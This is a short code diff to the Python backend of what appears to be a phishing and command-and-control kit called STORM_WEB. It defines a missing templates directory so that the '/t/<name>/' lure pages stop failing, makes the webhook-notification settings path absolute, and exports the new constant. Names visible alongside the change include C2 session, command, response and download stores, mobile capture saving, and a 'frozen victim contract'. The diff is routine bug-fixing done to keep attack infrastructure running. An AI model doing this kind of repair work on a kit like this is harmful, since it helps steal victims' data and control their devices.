@@ -32,6 +32,11 @@ STORM_WEB = Path(__file__).resolve().parent.parent
 PHP_CONFIG_PATH = STORM_WEB / "config.php"
 CHECK_C_PATH = STORM_WEB / "check-c.json"
 BASE_DIR = str(STORM_WEB)
+# P16: TEMPLATES_DIR was referenced 5x in blueprints/templates.py but never
+# defined anywhere -- every /t/<name>/ lure page raised NameError -> 500.
+# Nothing caught it: the audit and the frozen victim contract only listed the
+# '/t/' *prefix*, never a concrete kit path.
+TEMPLATES_DIR = os.path.join(BASE_DIR, 'templates')
 
 
 # === Login brute-force lockout (was _LOGIN_FAILS in app.py:66) ==============
@@ -181,8 +186,9 @@ def send_notification(message_data: Dict[str, Any]) -> None:
     """
     try:
         import requests as _requests
-        if os.path.exists('Settings.json'):
-            with open('Settings.json', 'r') as f:
+        settings_path = os.path.join(BASE_DIR, 'Settings.json')
+        if os.path.exists(settings_path):
+            with open(settings_path, 'r') as f:
                 settings = json.load(f)
             webhook_url = settings.get('generic_webhook')
             if webhook_url:
@@ -250,7 +256,7 @@ def _save_mobile_capture(uid, capture_type, field, extra_meta=None):
 
 
 __all__ = [
-    "BASE_DIR", "PHP_CONFIG_PATH", "CHECK_C_PATH",
+    "BASE_DIR", "PHP_CONFIG_PATH", "CHECK_C_PATH", "TEMPLATES_DIR",
     "LOGIN_FAILS", "ANALYTICS", "CONFIG",
     "C2_SESSIONS", "C2_COMMANDS", "C2_RESPONSES",
     "C2_FILE_LISTS", "C2_DOWNLOADS",
